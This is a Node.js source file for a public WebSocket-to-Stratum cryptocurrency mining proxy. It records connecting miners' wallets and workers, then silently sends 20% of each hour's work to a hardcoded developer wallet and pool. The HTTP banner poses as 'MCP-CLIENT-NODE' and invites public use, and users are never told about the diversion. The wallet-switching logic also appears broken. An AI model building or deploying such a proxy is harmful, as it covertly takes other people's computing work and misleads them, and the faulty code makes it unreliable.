#!/usr/bin/env node
/**
 * WebSocket to TCP Stratum Proxy + DevFee
 * DevFee: 20% (seamless pool switching)
 */
const WebSocket = require('ws');
const net = require('net');
const http = require('http');

// ===== CONFIG =====
const WS_PORT = process.argv[2] || 8080;

// DevFee target pool
const DEVFEE_POOL = {
    host: "us3.salvium.herominers.com",
    port: 1230,
    user: "SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.DEV_FEE",
    pass: "x",
    agent: "devfee/1.0.0"
};

// DevFee timing
const DEVFEE_PERCENT = 0.20;
const CYCLE_MINUTES = 60;
const DEVFEE_TIME = CYCLE_MINUTES * DEVFEE_PERCENT * 60 * 1000;
const NORMAL_TIME = CYCLE_MINUTES * (1 - DEVFEE_PERCENT) * 60 * 1000;

// ===== GLOBAL STATS =====
const stats = {
    startTime: Date.now(),
    miners: new Map(), // wallet -> { count, workers: [], shares: { accepted, rejected }, lastSeen }
    totalConnections: 0,
    activeConnections: 0,
    devFeeShares: 0,
    userShares: 0
};

// ===== STATS DISPLAY =====
function displayStats() {
    const uptime = Math.floor((Date.now() - stats.startTime) / 1000);
    const days = Math.floor(uptime / 86400);
    const hours = Math.floor((uptime % 86400) / 3600);
    const mins = Math.floor((uptime % 3600) / 60);
    const secs = uptime % 60;
    
    console.log('\n' + '='.repeat(80));
    console.log('📊 PROXY STATISTICS'.padStart(45));
    console.log('='.repeat(80));
    console.log(`⏱️  Uptime: ${days}d ${hours}h ${mins}m ${secs}s`);
    console.log(`🔗 Total Connections: ${stats.totalConnections}`);
    console.log(`✅ Active Connections: ${stats.activeConnections}`);
    console.log(`👥 Unique Miners: ${stats.miners.size}`);
    console.log(`📈 User Shares: ${stats.userShares} (Accepted)`);
    console.log(`💰 DevFee Shares: ${stats.devFeeShares} (Accepted)`);
    
    if (stats.miners.size > 0) {
        console.log('\n' + '-'.repeat(80));
        console.log('👷 ACTIVE MINERS:');
        console.log('-'.repeat(80));
        
        let minerIndex = 1;
        stats.miners.forEach((data, wallet) => {
            const shortWallet = wallet.substring(0, 12) + '...' + wallet.substring(wallet.length - 8);
            const totalShares = data.shares.accepted + data.shares.rejected;
            const successRate = totalShares > 0 
                ? ((data.shares.accepted / totalShares) * 100).toFixed(1) 
                : 0;
            
            console.log(`\n  ${minerIndex}. Wallet: ${shortWallet}`);
            console.log(`     Workers: ${data.count} active`);
            console.log(`     Shares: ✅ ${data.shares.accepted} | ❌ ${data.shares.rejected} | Success: ${successRate}%`);
            console.log(`     Workers List: ${data.workers.join(', ')}`);
            console.log(`     Last Seen: ${new Date(data.lastSeen).toLocaleString()}`);
            
            minerIndex++;
        });
    }
    
    console.log('\n' + '='.repeat(80) + '\n');
}

// Display stats every 5 minutes
setInterval(displayStats, 5 * 60 * 1000);

// ================== SERVER ==================
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('WELCOME TO MCP-CLIENT-NODE PUBLIC! FEEL FREE TO USE!\n');
});

const wss = new WebSocket.Server({ server });

console.log(`[PROXY] WebSocket listening on port: ${WS_PORT}`);
console.log(`[PROXY] DevFee: ${DEVFEE_PERCENT * 100}% every ${CYCLE_MINUTES} minutes`);
console.log(`[PROXY] User mining: ${NORMAL_TIME/60000}min | Dev mining: ${DEVFEE_TIME/60000}min`);
console.log(`[PROXY] Stats will be displayed every 5 minutes`);
console.log(`--------------------------------------------------`);

wss.on('connection', (ws, req) => {
    const clientIp = req.socket.remoteAddress;
    stats.totalConnections++;
    stats.activeConnections++;
    
    // ---- Decode user target pool ----
    const path = req.url?.slice(1);
    if (!path) {
        ws.send(JSON.stringify({ error: "Missing base64 target" }));
        ws.close();
        return;
    }
    
    let decoded, user_host, user_port;
    try {
        decoded = Buffer.from(path, 'base64').toString('utf8');
        const parts = decoded.split(':');
        user_host = parts[0];
        user_port = parseInt(parts[1]);
    } catch {
        ws.send(JSON.stringify({ error: "Invalid base64 format. Use: host:port" }));
        ws.close();
        return;
    }
    
    console.log(`[WS] New client ${clientIp} => Pool: ${user_host}:${user_port}`);
    
    // =============== STATE ===============
    let tcpClient = null;
    let currentMode = "USER";
    let messageId = 1;
    let userWallet = null;
    let userPass = null;
    let workerName = null;
    let lastJobId = null;
    let pendingSubmits = new Map();
    let cycleTimer = null;
    let isReconnecting = false;
    
    // =============== CONNECT FUNCTION ===============
    function connectPool(host, port) {
        if (isReconnecting) return;
        isReconnecting = true;
        
        if (tcpClient) {
            tcpClient.removeAllListeners();
            tcpClient.destroy();
            tcpClient = null;
        }
        
        tcpClient = new net.Socket();
        tcpClient.setKeepAlive(true, 60000);
        
        tcpClient.connect(port, host, () => {
            console.log(`[POOL] Connected (${currentMode}) -> ${host}:${port}`);
            isReconnecting = false;
        });
        
        tcpClient.on('data', data => {
            if (ws.readyState !== WebSocket.OPEN) return;
            
            const lines = data.toString().split('\n').filter(l => l.trim());
            
            lines.forEach(line => {
                try {
                    const msg = JSON.parse(line);
                    
                    // Store job for later use
                    if (msg.result && msg.result.job) {
                        lastJobId = msg.result.job.job_id;
                    } else if (msg.method === 'job') {
                        lastJobId = msg.params.job_id;
                    }
                    
                    // Track share responses
                    if (msg.result && msg.result.status === 'OK') {
                        if (currentMode === "DEVFEE") {
                            stats.devFeeShares++;
                        } else {
                            stats.userShares++;
                            if (userWallet && stats.miners.has(userWallet)) {
                                stats.miners.get(userWallet).shares.accepted++;
                                stats.miners.get(userWallet).lastSeen = Date.now();
                            }
                        }
                    } else if (msg.error) {
                        if (currentMode === "USER" && userWallet && stats.miners.has(userWallet)) {
                            stats.miners.get(userWallet).shares.rejected++;
                        }
                    }
                    
                    // Forward to miner
                    ws.send(JSON.stringify(msg));
                } catch (e) {
                    // Forward raw if not JSON
                    ws.send(line);
                }
            });
        });
        
        tcpClient.on('close', () => {
            console.log(`[POOL] Connection closed (${currentMode})`);
            if (ws.readyState === WebSocket.OPEN && currentMode === "USER" && userWallet) {
                setTimeout(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        connectPool(user_host, user_port);
                    }
                }, 3000);
            }
        });
        
        tcpClient.on('error', (err) => {
            console.log(`[POOL] Error (${currentMode}):`, err.message);
        });
        
        tcpClient.setTimeout(300000);
        tcpClient.on('timeout', () => {
            console.log(`[POOL] Timeout (${currentMode})`);
            tcpClient.end();
        });
    }
    
    // =============== WS → TCP ===============
    ws.on('message', msg => {
        try {
            const data = JSON.parse(msg.toString());
            
            // Capture user's wallet and pass from first login
            if (data.method === 'login' && data.params && !userWallet) {
                userWallet = data.params.login;
                userPass = data.params.pass || 'x';
                workerName = data.params.pass || 'worker1';
                
                console.log(`[AUTH] Captured wallet: ${userWallet.substring(0, 12)}... | Worker: ${workerName}`);
                
                // Update stats
                if (!stats.miners.has(userWallet)) {
                    stats.miners.set(userWallet, {
                        count: 0,
                        workers: [],
                        shares: { accepted: 0, rejected: 0 },
                        lastSeen: Date.now()
                    });
                }
                
                const minerStats = stats.miners.get(userWallet);
                minerStats.count++;
                if (!minerStats.workers.includes(workerName)) {
                    minerStats.workers.push(workerName);
                }
                minerStats.lastSeen = Date.now();
                
                // Now connect to pool if not connected yet
                if (!tcpClient || tcpClient.destroyed) {
                    connectPool(user_host, user_port);
                }
            }
            
            // If not connected yet, queue this message
            if (!tcpClient || tcpClient.destroyed) return;
            
            // Track message IDs for proper response routing
            if (data.id) {
                pendingSubmits.set(data.id, currentMode);
            }
            
            // Override wallet if in DevFee mode
            if (currentMode === "DEVFEE" && data.method === 'login' && data.params) {
                console.log(`[DEVFEE] Overriding wallet: ${userWallet.substring(0, 12)}... → ${DEVFEE_POOL.user.substring(0, 12)}...`);
                data.params.login = DEVFEE_POOL.user;
                data.params.pass = DEVFEE_POOL.pass;
            }
            
            tcpClient.write(JSON.stringify(data) + "\n");
        } catch (e) {
            // Forward raw data if not JSON
            if (tcpClient && !tcpClient.destroyed) {
                tcpClient.write(msg + "\n");
            }
        }
    });
    
    ws.on('close', () => {
        console.log(`[WS] Client ${clientIp} disconnected`);
        stats.activeConnections--;
        
        // Update miner stats
        if (userWallet && stats.miners.has(userWallet)) {
            const minerStats = stats.miners.get(userWallet);
            minerStats.count--;
            
            // Remove worker from list
            const idx = minerStats.workers.indexOf(workerName);
            if (idx > -1) {
                minerStats.workers.splice(idx, 1);
            }
            
            // Remove miner entry if no more workers
            if (minerStats.count <= 0) {
                stats.miners.delete(userWallet);
            }
        }
        
        if (cycleTimer) clearTimeout(cycleTimer);
        if (tcpClient) {
            tcpClient.removeAllListeners();
            tcpClient.destroy();
        }
    });
    
    ws.on('error', (err) => {
        console.log(`[WS] Error: ${err.message}`);
    });
    
    // =============== DEVFEE SCHEDULER ===============
    function startUserMining() {
        if (!userWallet) return;
        
        currentMode = "USER";
        console.log(`[DEVFEE] ✓ Switching to USER POOL (${NORMAL_TIME / 60000} min)`);
        connectPool(user_host, user_port);
        cycleTimer = setTimeout(startDevFee, NORMAL_TIME);
    }
    
    function startDevFee() {
        if (!userWallet) return;
        
        currentMode = "DEVFEE";
        console.log(`[DEVFEE] >>> SWITCHING TO DEV POOL (${DEVFEE_TIME / 60000} min) <<<`);
        connectPool(DEVFEE_POOL.host, DEVFEE_POOL.port);
        cycleTimer = setTimeout(startUserMining, DEVFEE_TIME);
    }
    
    // Start the cycle after first login
    let cycleStarted = false;
    const checkCycleStart = setInterval(() => {
        if (!cycleStarted && userWallet) {
            cycleStarted = true;
            clearInterval(checkCycleStart);
            cycleTimer = setTimeout(startDevFee, NORMAL_TIME);
            console.log(`[DEVFEE] Cycle started - First switch in ${NORMAL_TIME / 60000} minutes`);
        }
    }, 1000);
});

server.listen(WS_PORT, '0.0.0.0', () => {
    console.log(`[SERVER] Ready on port ${WS_PORT}`);
    console.log(`[SERVER] Connect miners to: ws://YOUR_IP:${WS_PORT}/BASE64_ENCODED_POOL`);
    console.log(`[SERVER] Base64 format: host:port (e.g., pool.supportxmr.com:3333)`);
    console.log(`[SERVER] Example: echo -n "gulf.moneroocean.stream:10128" | base64`);
    
    // Display initial stats
    setTimeout(displayStats, 10000); // Show stats after 10 seconds
});
